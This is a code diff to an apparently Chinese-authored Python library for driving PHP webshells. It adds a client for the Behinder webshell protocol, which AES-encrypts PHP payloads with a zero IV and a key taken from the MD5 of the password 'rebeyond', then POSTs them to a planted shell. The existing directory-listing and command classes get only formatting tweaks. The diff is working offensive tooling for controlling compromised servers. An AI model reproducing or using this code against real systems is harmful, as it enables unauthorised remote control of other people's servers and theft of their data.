@@ -1,5 +1,7 @@
 """PHP Session的实现"""
+
 import base64
+import hashlib
 import json
 import logging
 import random
@@ -9,6 +11,8 @@ import typing as t
 from dataclasses import dataclass
 
 import httpx
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
 
 from . import exceptions
 from ..utils import random_english_words
@@ -64,7 +68,27 @@ else if(filesize($filePath) > MAX_SIZE) {
 }
 """
 
-__all__ = ["PHPWebshell", "PHPWebshellOneliner"]
+__all__ = ["PHPWebshell", "PHPWebshellOneliner", "PHPWebshellBehinderAES"]
+
+
+def md5_encode(s):
+    if isinstance(s, str):
+        s = s.encode()
+    return hashlib.md5(s).hexdigest()
+
+
+def base64_encode(s):
+    if isinstance(s, str):
+        s = s.encode("utf-8")
+    return base64.b64encode(s).decode()
+
+
+def behinder_aes(payload, key):
+    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+    payload = "1|" + payload
+    payload = pad(payload.encode(), AES.block_size)
+    return base64_encode(cipher.encrypt(payload))
 
 
 @dataclass
@@ -122,13 +146,16 @@ class PHPWebshell(Session):
                     if item["type"] in ["dir", "file", "link-dir", "link-file"]
                     else "unknown"
                 ),
-                filesize=item["filesize"]
+                filesize=item["filesize"],
             )
             for item in result
         ]
         if not any(entry.name == ".." for entry in result):
             result.insert(
-                0, DirectoryEntry(name="..", permission="555", filesize=-1, entry_type="dir")
+                0,
+                DirectoryEntry(
+                    name="..", permission="555", filesize=-1, entry_type="dir"
+                ),
             )
         return result
 
@@ -249,5 +276,26 @@ class PHPWebshellOneliner(PHPWebshell):
                 )
                 return response.status_code, response.text
 
+        except httpx.HTTPError as exc:
+            raise exceptions.NetworkError("发送HTTP请求失败") from exc
+
+
+class PHPWebshellBehinderAES(PHPWebshell):
+    def __init__(
+        self,
+        url: str,
+        password: str,  # "rebeyond"
+        options: t.Union[PHPWebshellOptions, None] = None,
+    ):
+        super().__init__(options)
+        self.url = url
+        self.key = md5_encode(password)[:16].encode()
+
+    async def submit_raw(self, payload):
+        data = behinder_aes(payload, self.key)
+        try:
+            async with httpx.AsyncClient() as client:
+                response = await client.request(method="POST", url=self.url, data=data)
+                return response.status_code, response.text
         except httpx.HTTPError as exc:
             raise exceptions.NetworkError("发送HTTP请求失败") from exc
